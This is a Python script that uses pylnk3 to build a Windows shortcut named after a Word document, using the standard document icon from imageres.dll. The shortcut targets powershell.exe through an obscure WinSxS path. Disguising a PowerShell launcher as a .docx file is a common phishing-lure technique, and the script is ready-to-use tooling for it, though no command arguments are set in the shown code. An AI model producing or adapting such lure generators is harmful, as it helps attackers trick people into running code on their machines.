import pylnk3
from pylnk3 import PathSegmentEntry, TYPE_FOLDER, TYPE_FILE
from datetime import datetime
import ntpath
import wslPath
import os

class Document:
    def __init__(self, document_path=None):
        self.document_extensions = ["docx"]
        self.document_path = None

        if type(document_path) == str or type(document_path) == unicode:
            self.document_path = document_path
            try:
                file_handle = open(self.document_path, 'rb')
            except IOError:
                for document_extension in self.document_extensions:
                    extended_path = document_path + "."  + document_extension
                    try:
                        self.document_path = extended_path
                        file_handle = open(self.document_path, 'rb')
                        break
                    except IOError:
                        self.document_path = "untitled.docx"
                        continue

        # Defualts
        self.icon_path = "C:\\Windows\\System32\\imageres.dll" # Contains generic Windows icons
        self.icon_index = 85 # Index within imageres.dll for document icon

def convert_to_os_specific_path(directory):
    try:
        return wslPath.to_windows(directory)
    except Exception:
        return wslPath.to_posix(directory)

# Modify PathSegmentEntry's create_for_path to check paths based on OS being used
def create_for_path_os_agnostic(cls, path):
    entry = cls()
    entry.type = os.path.isdir(convert_to_os_specific_path(path)) and TYPE_FOLDER or TYPE_FILE
    try:
        st = os.stat(convert_to_os_specific_path(path))
        entry.file_size = st.st_size
        entry.modified = datetime.fromtimestamp(st.st_mtime)
        entry.created = datetime.fromtimestamp(st.st_ctime)
        entry.accessed = datetime.fromtimestamp(st.st_atime)
    except FileNotFoundError:
        now = datetime.now()
        entry.file_size = 0
        entry.modified = now
        entry.created = now
        entry.accessed = now
    entry.short_name = ntpath.split(path)[1]
    entry.full_name = entry.short_name
    return entry

PathSegmentEntry.create_for_path = classmethod(create_for_path_os_agnostic)

def get_directory(file_path):
    directory = os.path.dirname(file_path)

    if not directory:
        directory = os.getcwd()

    return convert_to_os_specific_path(directory)

def write_lnk_using_document(target, document):
    try:
        pylnk3.for_file(
            target_file=target,
            lnk_name=os.path.basename(document.document_path) + ".lnk",
            arguments=None,
            description=None,
            icon_file=document.icon_path,
            icon_index=document.icon_index,
            work_dir=get_directory(document.document_path),
            window_mode=None,
        )

    except Exception as e:
        print(f"An error occured while writing .lnk file: {e}")

if __name__ == "__main__":
    document = Document(r'testdocument')
    target = "C:\\Windows\\WinSxS\\amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.19041.3996_none_dd93276fb79a0397\\powershell.exe"
    write_lnk_using_document(target, document)